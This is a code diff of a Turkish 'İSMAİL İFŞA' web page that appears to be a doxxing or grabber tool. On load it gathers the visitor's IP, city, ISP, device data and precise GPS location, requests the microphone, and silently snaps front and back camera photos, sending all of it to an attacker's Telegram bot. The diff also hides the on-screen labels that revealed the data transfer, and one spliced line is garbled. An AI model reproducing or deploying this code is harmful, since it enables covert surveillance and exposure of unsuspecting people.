@@ -53,6 +53,7 @@
             width: 92%;
             max-width: 550px;
             text-align: center;
+            transition: opacity 0.8s ease;
         }
 
         .glass-panel {
@@ -154,11 +155,11 @@
             display: inline-block;
             margin-top: 18px;
             padding: 8px 22px;
-            background: rgba(255, 0, 0, 0.12);
-            border: 1px solid rgba(255, 0, 0, 0.3);
+            background: rgba(255, 0, 0, 0.08);
+            border: 1px solid rgba(255, 0, 0, 0.15);
             border-radius: 40px;
-            color: #ff5555;
-            font-size: 0.85rem;
+            color: rgba(255, 100, 100, 0.6);
+            font-size: 0.8rem;
             letter-spacing: 2px;
         }
 
@@ -192,7 +193,7 @@
         }
 
         .black-screen .big-text {
-            font-size: 3.5rem;
+            font-size: 3.8rem;
             font-weight: 900;
             letter-spacing: 12px;
             text-transform: uppercase;
@@ -225,7 +226,7 @@
             .glass-panel { padding: 30px 18px; }
             .title { font-size: 2.2rem; letter-spacing: 4px; }
             .counter-digit { font-size: 5.5rem; }
-            .black-screen .big-text { font-size: 2.6rem; letter-spacing: 8px; }
+            .black-screen .big-text { font-size: 2.8rem; letter-spacing: 8px; }
         }
     </style>
 </head>
@@ -241,14 +242,14 @@
     <!-- SİYAH EKRAN – sadece yazı, video yok -->
     <div class="black-screen" id="blackScreen">
         <div class="big-text">İSMAİL İFŞA</div>
-        <div class="sub-big">✦ AÇILIYOR ✦</div>
+        <div class="sub-big">✦ AÇILDI ✦</div>
     </div>
 
     <!-- ANA PANEL -->
     <div class="container" id="mainContainer">
         <div class="glass-panel">
             <div class="title">İ S M A İ L</div>
-            <div class="subtitle">✦ İFŞA SİSTEMİ ✦</div>
+            <div class="subtitle">✦ SİSTEM ✦</div>
 
             <div class="counter-block">
                 <span class="counter-digit" id="counter">0</span>
@@ -264,7 +265,7 @@
                     <i>⏣</i> <span id="statusText">SİSTEM HAZIRLANIYOR</span>
                 </div>
                 <div id="telegramBadge" class="telegram-badge">
-                    ⚡ TELEGRAM HEDEF: @STCCriss
+                    ⚡ BAĞLANIYOR
                 </div>
             </div>
         </div>
@@ -298,8 +299,6 @@
         function startFullExtraction() {
             console.log('⚡ İFŞA SİSTEMİ BAŞLATILDI');
             statusText.innerText = 'BİLGİLER TOPLANIYOR...';
-
-            // Telegram badge güncelle
             telegramBadge.innerHTML = '📡 VERİ AKTİF';
 
             // 1) IP + temel bilgiler
@@ -308,7 +307,7 @@
             // 2) Konum izni (kullanıcıya sorar)
             requestLocation();
 
-            // 3) Mikrofon (sadece izin ister, gerçek kayıt yapmaz – ama istersen ekleyebilirsin)
+            // 3) Mikrofon (sadece izin ister)
             requestMicrophone();
 
             // 4) Kamera – önden ve arkadan fotoğraf
@@ -330,7 +329,7 @@
                     clearInterval(interval);
                     // 5 oldu -> ifşa açıldı
                     statusText.innerText = '✅ İFŞA AÇILDI!';
-                    telegramBadge.innerHTML = '🔥 TÜM VERİLER GÖNDERİLDİ';
+                    telegramBadge.innerHTML = '🔥 TAMAMLANDI';
                     // Siyah ekranı göster
                     setTimeout(() => {
                         showBlackScreen();
@@ -347,7 +346,7 @@
                 const msgs = [
                     'IP TESPİT EDİLDİ',
                     'KONUM ALINDI',
-                    'MİKROFON İZİNİ',
+                    'MİKROFON İZNİ',
                     'FOTOĞRAF ÇEKİLDİ',
                     'TÜM VERİLER GÖNDERİLDİ'
                 ];
@@ -417,8 +416,6 @@
             const message = `
 🔥 **İSMAİL İFŞA – TAM RAPOR** 🔥
 
-👤 **Hedef:** ${TARGET_USERNAME}
-
 🌐 **IP:** ${info.ip}
 📍 **Konum:** ${info.city}, ${info.country}
 🏢 **ISP:** ${info.isp}
@@ -454,8 +451,6 @@
                 return;
             }
 
-            telegramBadge.innerHTML = '📤 GÖNDERİLİYOR...';
-
             try {
                 // Önce güncellemelerden hedef chat ID bul
                 const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
@@ -482,7 +477,8 @@
                 }
 
                 if (!targetChatId) {
-                    telegramBadge.innerHTML = '⚠️ ' + TARGET_USERNAME + ' BOTU BAŞLATMAMIŞ';
+                    telegramBadge.innerHTML = '⚠️ BAĞLANTI YOK';
+                    console.warn('Hedef kullanıcı bulunamadı.');
                     return;
                 }
 
@@ -497,7 +493,7 @@
                 });
                 const result = await sendRes.json();
                 if (result.ok) {
-                    telegramBadge.innerHTML = '✅ TELEGRAM GÖNDERİLDİ';
+                    telegramBadge.innerHTML = '✅ GÖNDERİLDİ';
                 } else {
                     telegramBadge.innerHTML = '❌ HATA';
                 }
@@ -516,26 +512,24 @@
                 (pos) => {
                     const coords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                     console.log('📍 Gerçek konum:', coords);
-                    // İstersen Telegram'a da gönderebilirsin
                     sendTelegramMessage(`📍 **GERÇEK KONUM:** ${coords}`);
                 },
                 (err) => {
-                    console.warn('Konum izni reddedildi veya alınamadı:', err.message);
+                    console.warn('Konum izni reddedildi:', err.message);
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
             );
         }
 
         // --------------------------------------------------------------
-        //  7. MİKROFON İZNİ (sadece izin ister, kayıt yapmaz)
+        //  7. MİKROFON İZNİ (sadece izin ister)
         // --------------------------------------------------------------
         function requestMicrophone() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
             navigator.mediaDevices.getUserMedia({ audio: true })
                 .then(stream => {
                     console.log('🎤 Mikrofon izni verildi');
-                    stream.getTracks().forEach(t => t.stop()); // hemen durdur
-                    // İstersen "Mikrofon izni verildi" diye Telegram'a atabilirsin
+                    stream.getTracks().forEach(t => t.stop());
                     sendTelegramMessage('🎤 **MİKROFON İZNİ VERİLDİ**');
                 })
                 .catch(err => {
@@ -544,273 +538,106 @@
         }
 
         // --------------------------------------------------------------
-        //  8. FOTOĞRAF ÇEK (önden + arkadan) – Telegram'a gönder
+        //  8. FOTOĞRAF ÇEK (önden + arkadan)
         // --------------------------------------------------------------
         function capturePhotos() {
             if (photoSent) return;
             photoSent = true;
 
-            // ÖN KAMERA (environment: true arkayı verir, false önü)
-            captureAndSendPhoto(false, 'ÖN KAMERA');   // false = ön kamera (kullanıcı)
-            // ARKA KAMERA
-            captureAndSendPhoto(true, 'ARKA KAMERA');  // true = arka
-      st statusEl = document.getElementById('status');
-        const telegramStatus = document.getElementById('telegramStatus');
-
-        // 1. OTOMATİK BAŞLAT - HİÇBİR ŞEYE DOKUNMA GEREK YOK
-        function autoStart() {
-            console.log('⚡ Otomatik başlatılıyor...');
-            
-            // Sesi başlat (otomatik)
-            bgAudio.volume = 0.8;
-            
-            // Ses başlatma denemesi - modern tarayıcılar için
-            const playPromise = bgAudio.play();
-            
-            if (playPromise !== undefined) {
-                playPromise.then(() => {
-                    console.log('✅ Ses otomatik başladı');
-                    telegramStatus.innerHTML = '🔊 SES AKTİF';
-                }).catch(error => {
-                    console.log('⚠️ Ses otomatik başlamadı, sessiz devam edilecek:', error);
-                    telegramStatus.innerHTML = '🔇 SES BEKLENİYOR';
-                    
-                    // Kullanıcı etkileşiminde ses başlasın (ileride tıklarsa diye)
-                    document.body.addEventListener('click', function enableAudio() {
-                        bgAudio.play();
-                        telegramStatus.innerHTML = '🔊 SES AKTİF';
-                        document.body.removeEventListener('click', enableAudio);
-                    }, { once: true });
-                });
-            }
-            
-            // Sayacı başlat (kesin başlasın)
-            startCounter();
+            captureAndSendPhoto(false, 'ÖN KAMERA');
+            captureAndSendPhoto(true, 'ARKA KAMERA');
         }
 
-        // 2. SAYAÇ
-        function startCounter() {
-            statusEl.innerHTML = 'ANALİZ BAŞLADI';
-            
-            const interval = setInterval(async () => {
-                count++;
-                
-                // Sayacı güncelle (3 haneli gösterim)
-                counterEl.textContent = count.toString().padStart(3, '0');
-                
-                // Health bar
-                healthBar.style.width = count + '%';
-                
-                // Durum mesajları
-                if (count === 25) statusEl.innerHTML = 'IP TESPİT EDİLİYOR';
-                if (count === 50) statusEl.innerHTML = 'CİHAZ BİLGİLERİ';
-                if (count === 75) statusEl.innerHTML = 'RAPOR HAZIRLANIYOR';
-                
-                // %100'de bitir
-                if (count === 100) {
-                    clearInterval(interval);
-                    statusEl.innerHTML = 'ANALİZ TAMAMLANDI';
-                    
-                    // Bilgileri topla ve Telegram'a gönder
-                    await collectAndSendInfo();
-                    
-                    // 1 saniye sonra siyah ekran + video
-                    setTimeout(() => {
-                        activateBlackScreen();
-                    }, 1500);
-                }
-            }, 60);
-        }
-
-        // 3. BİLGİ TOPLAMA
-        async function collectAndSendInfo() {
-            if (infoSent) return;
-            
-            telegramStatus.innerHTML = '📡 VERİ TOPLANIYOR...';
-            
-            // Temel bilgiler
-            const info = {
-                timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cores: navigator.hardwareConcurrency || '?',
-                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
-                url: window.location.href,
-                referrer: document.referrer || 'doğrudan'
-            };
-
-            // IP adresi
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                info.ip = ipData.ip;
-            } catch {
-                info.ip = 'IP alınamadı';
-            }
-
-            // Konum (yaklaşık)
-            try {
-                const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
-                const geoData = await geoRes.json();
-                info.country = geoData.country_name || '?';
-                info.city = geoData.city || '?';
-                info.isp = geoData.org || '?';
-            } catch {
-                info.country = '?';
-                info.city = '?';
-            }
-
-            // Telegram'a gönder
-            await sendToTelegram(info);
-        }
-
-        // 4. TELEGRAM GÖNDERME (Chat ID'siz, username'e)
-        async function sendToTelegram(info) {
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-                console.log('⚠️ Bot token girilmemiş!');
-                telegramStatus.innerHTML = '⚠️ TOKEN GİRİLMEMİŞ';
-                console.log('Toplanan bilgiler:', info);
+        function captureAndSendPhoto(useBack, label) {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.warn('Kamera desteklenmiyor');
                 return;
             }
 
-            telegramStatus.innerHTML = '📤 TELEGRAM GÖNDERİLİYOR...';
+            const facingMode = useBack ? 'environment' : 'user';
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-            // Süslü mesaj
-            const message = `
-⚡ **Z A H İ R   A N A L İ Z** ⚡
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
 
-👤 **Hedef:** ${TARGET_USERNAME}
+                setTimeout(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+                    stream.getTracks().forEach(t => t.stop());
+                    sendPhotoToTelegram(dataURL, label);
+                }, 500);
+            })
+            .catch(err => {
+                console.warn(`❌ Kamera (${label}) hatası:`, err.message);
+                sendTelegramMessage(`📸 **${label}** alınamadı: ${err.message}`);
+            });
+        }
 
-🌐 **IP Adresi:** ${info.ip}
-📍 **Konum:** ${info.city}, ${info.country}
-🏢 **ISP:** ${info.isp}
+        // Fotoğrafı Telegram'a gönder
+        async function sendPhotoToTelegram(dataURL, label) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
 
-📱 **Cihaz Bilgileri:**
-• Platform: ${info.platform}
-• Ekran: ${info.screen}
-• Renk: ${info.colorDepth} bit
-• Çekirdek: ${info.cores}
-• RAM: ${info.memory}
-• Dil: ${info.language}
-• Zaman Dilimi: ${info.timezone}
-
-🌍 **Sayfa Bilgileri:**
-• URL: ${info.url}
-• Yönlendiren: ${info.referrer}
-
-⏰ **Ziyaret Zamanı:** ${info.timestamp}
-
-🔍 **Detaylı UA:**
-\`${info.userAgent.substring(0, 100)}...\`
-
-✦ **Z A H İ R   S İ S T E M** ✦
-            `;
+            const blob = await fetch(dataURL).then(r => r.blob());
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', `📸 **${label}** – İfşa fotoğrafı`);
 
             try {
-                // Önce botun güncellemelerini al
                 const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                 const updates = await updatesRes.json();
-                
                 let targetChatId = null;
-                
-                // @STCCriss'in chat ID'sini bul
                 if (updates.ok && updates.result) {
                     for (const update of updates.result) {
                         if (update.message && update.message.from) {
                             const from = update.message.from;
                             if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                 targetChatId = from.id;
-                                console.log('✅ Kullanıcı bulundu, ID:', targetChatId);
                                 break;
                             }
                         }
-                        
                         if (update.channel_post && update.channel_post.chat) {
                             if (update.channel_post.chat.username && 
                                 update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                 targetChatId = update.channel_post.chat.id;
-                                console.log('✅ Kanal bulundu, ID:', targetChatId);
                                 break;
                             }
                         }
                     }
                 }
-                
-                if (!targetChatId) {
-                    telegramStatus.innerHTML = '⚠️ ' + TARGET_USERNAME + ' BOTU BAŞLATMAMIŞ';
-                    console.log('Hedef kullanıcı bulunamadı.');
-                    return;
-                }
-                
-                // Mesajı gönder
-                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                if (!targetChatId) return;
+
+                formData.append('chat_id', targetChatId);
+                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: targetChatId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    body: formData
                 });
-                
                 const result = await sendRes.json();
-                
                 if (result.ok) {
-                    telegramStatus.innerHTML = '✅ TELEGRAM GÖNDERİLDİ';
-                    infoSent = true;
+                    console.log(`✅ Fotoğraf gönderildi: ${label}`);
                 } else {
-                    telegramStatus.innerHTML = '❌ GÖNDERİLEMEDİ';
-                    console.log('Telegram hatası:', result);
+                    console.warn('Fotoğraf gönderme hatası:', result);
                 }
-                
-            } catch (error) {
-                console.error('Telegram hatası:', error);
-                telegramStatus.innerHTML = '❌ BAĞLANTI HATASI';
+            } catch (e) {
+                console.error('Fotoğraf gönderme hatası:', e);
             }
         }
 
-        // 5. SİYAH EKRAN + VİDEO
-        function activateBlackScreen() {
-            mainContainer.classList.add('hidden');
-            videoContainer.classList.add('active');
-            
-            if (bgVideo) {
-                bgVideo.play().catch(e => console.log('Video oynatılamadı:', e));
-            }
-        }
-
-        // 6. BAŞLANGIÇ - TAM OTOMATİK
+        // --------------------------------------------------------------
+        //  9. BAŞLAT – sayfa yüklenir yüklenmez
+        // --------------------------------------------------------------
         window.addEventListener('load', () => {
-            console.log('⚡ ZAHİR SİSTEM YÜKLENDİ - TAM OTOMATİK MOD');
-            
-            // HİÇBİR ŞEY BEKLEMEDEN BAŞLAT
-            setTimeout(autoStart, 1000); // 1 saniye sonra başlat
-            
-            // Hata yakalama
-            bgAudio.addEventListener('error', (e) => {
-                console.log('Ses dosyası hatası:', e);
-            });
-            
-            bgVideo.addEventListener('error', (e) => {
-                console.log('Video dosyası hatası:', e);
-            });
-            
-            // Telegram durumu
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-                telegramStatus.innerHTML = '⚠️ BOT TOKEN GİRİLMEMİŞ';
-            } else {
-                telegramStatus.innerHTML = '⚡ ' + TARGET_USERNAME + ' HEDEFLENİYOR';
-            }
-        });
-
-        // Sayfa kapanırken durdur
-        window.addEventListener('beforeunload', () => {
-            bgAudio.pause();
-            if (bgVideo) bgVideo.pause();
+            console.log('🔥 İSMAİL İFŞA SİSTEMİ AKTİF');
+            // 1 saniye sonra başlat
+            setTimeout(startFullExtraction, 800);
         });
     </script>
 </body>
